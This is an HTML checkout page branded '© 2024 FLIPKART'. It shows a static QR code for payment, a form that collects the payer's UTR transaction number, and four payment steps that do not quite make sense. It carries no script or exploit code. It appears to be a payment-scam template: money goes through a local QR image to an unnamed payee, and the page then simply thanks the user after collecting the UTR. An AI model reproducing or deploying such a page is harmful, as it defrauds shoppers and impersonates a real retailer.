<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Page</title>
    
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }

        header {
            background-color: #333;
            color: #fff;
            padding: 20px;
            text-align: center;
        }

        main {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        section {
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
        }

        input[type="text"],
        input[type="email"],
        input[type="number"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        button[type="submit"] {
            background-color: #333;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button[type="submit"]:hover {
            background-color: #555;
        }

        footer {
            background-color: #333;
            color: #fff;
            text-align: center;
            padding: 10px;
            position: fixed;
            bottom: 0;
            width: 100%;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        table, th, td {
            border: 1px solid #ccc;
        }

        th, td {
            padding: 10px;
            text-align: left;
        }

        @media screen and (max-width: 600px) {
            main {
                padding: 10px;
            }
        }
    </style>
</head>
<body>

    <header>
        <h1>Secure Payment Checkout</h1>
    </header>

    <main>
        <!-- QR Code for scanning and payment -->
        <img src="images/1299.png" alt="QR Code for scanning and payment" width="200">
        
        <!-- Section for filling out UTR number -->
        <section>
            <h2>Enter UTR Number</h2>
            <form action="thanks.html" method="post">
                <label for="utr_number">UTR Number:</label><br>
                <input type="text" id="utr_number" name="utr_number" required=""><br>
                <button type="submit">Submit UTR</button>
            </form>
        </section>

        <!-- Table of instructions on how to pay -->
        <section>
            <h2>Instructions for Payment</h2>
            <table>
                <tbody><tr>
                    <td>Step 1:</td>
                    <td>Scan the QR code using your mobile banking app.</td>
                </tr>
                <tr>
                    <td>Step 2:</td>
                    <td>Enter the payment amount.</td>
                </tr>
                <tr>
                    <td>Step 3:</td>
                    <td>Enter your UTR number in the payment details.</td>
                </tr>
                <tr>
                    <td>Step 4:</td>
                    <td>Complete the payment.</td>
                </tr>
            </tbody></table>
        </section>
    </main>

    <footer>
        <p>Â© 2024 FLIPKART. All rights reserved.</p>
    </footer>


</body></html>
